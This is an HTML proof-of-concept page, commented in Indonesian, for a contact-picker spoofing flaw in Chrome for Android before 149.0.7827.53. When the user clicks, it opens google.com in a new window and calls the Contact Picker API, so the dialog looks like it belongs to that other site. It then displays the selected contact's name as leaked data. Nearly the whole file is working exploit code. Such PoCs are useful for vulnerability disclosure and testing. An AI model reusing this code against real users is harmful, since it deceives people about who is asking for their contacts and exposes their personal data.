<!DOCTYPE html>
<html lang="en">
<head>
    <title>Contact Picker UI Spoof PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <script>
        async function triggerSpoof() {
            // 1. Buka halaman penipuan terlebih dahulu (pengguna akan mengira permintaan kontak berasal dari sini)
            open("https://www.google.com", "PoC", "_blank");

            try {
                // 2. Panggil pemilih kontak sistem
                const contacts = await navigator.contacts.select(["name"], { multiple: false });

                // 3. Penanganan jika pengguna membatalkan pemilihan
                if (!contacts || contacts.length === 0) {
                    document.body.innerHTML = '<h1 style="color:orange">Pemilihan dibatalkan atau tidak ada kontak yang dipilih</h1>';
                    return;
                }

                // 4. Tampilkan informasi yang bocor
                const name = contacts[0]["name"] && contacts[0]["name"][0] ? contacts[0]["name"][0] : "(tidak ada nama)";
                document.body.innerHTML = `
                    <h1 style="color:red; word-break:break-all;">
                        Leaked information: ${name}
                    </h1>
                `;
            } catch (e) {
                // Menangkap error yang mungkin terjadi (misalnya API tidak didukung atau dibatasi izin)
                document.body.innerHTML = `<h1 style="color:gray;">Picker gagal: ${e.message}</h1>`;
            }
        }

        // Pasang listener setelah DOM siap, hindari penempatan onclick di luar body
        document.addEventListener('DOMContentLoaded', () => {
            document.body.addEventListener('click', triggerSpoof, { once: true });
        });
    </script>
</head>
<body style="margin:0; padding:0;">
    <br><br><br>
    <center>
        <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
        <p style="color:#666; font-size:14px;">
            (Berlaku untuk Chrome Android &lt; 149.0.7827.53, memerlukan interaksi pengguna)
        </p>
    </center>
</body>
</html>
